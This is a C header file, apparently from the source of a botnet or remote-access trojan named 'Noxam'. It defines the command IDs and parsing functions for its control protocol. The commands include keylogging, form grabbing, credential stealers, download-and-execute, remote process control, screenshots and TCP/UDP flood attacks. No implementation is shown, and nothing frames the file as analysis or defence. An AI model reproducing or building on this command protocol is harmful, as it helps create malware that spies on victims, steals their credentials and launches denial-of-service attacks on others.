#ifndef NOXAM_NOXAMCOMMAND_HXX
#define NOXAM_NOXAMCOMMAND_HXX


#define NOXAM_COMMAND_JOIN 0
#define NOXAM_COMMAND_POLL 1
#define NOXAM_COMMAND_CHECKIFSITEISUP 2
#define NOXAM_COMMAND_SHUTDOWN 3
#define NOXAM_COMMAND_RESTART 4
#define NOXAM_COMMAND_MESSAGEBOX 5
#define NOXAM_COMMAND_KEYLOG 6
#define NOXAM_COMMAND_REMOTEPROCESS 7
#define NOXAM_COMMAND_DOWNLOADEXECUTE 8
#define NOXAM_COMMAND_REMOTEPROCESSNORESULT 9
#define NOXAM_COMMAND_TCPFLOOD 10
#define NOXAM_COMMAND_UPDATE 11
#define NOXAM_COMMAND_SCREENSHOT 12
#define NOXAM_COMMAND_UDPFLOOD 13
#define NOXAM_COMMAND_FORMGRAB 14
#define NOXAM_COMMAND_STEALERS 15

typedef void(*NoxamCommandParserDelegate) (int, int, char*);
typedef void(*NoxamPostPollDelegate) ();

char* NoxamCreateCommand(int NxmCommandID, int NxmCommandType, char *NxmData, int NxmDataLength);
int NoxamParseCommand(char* NxmCommand, char** NxmCommandData, int* NxmCommandType);

void NoxamFreeCommand(char *NxmData);
void NoxamFreeParseCommandResult(char *NxmData);


#endif NOXAM_NOXAMCOMMAND_HXX
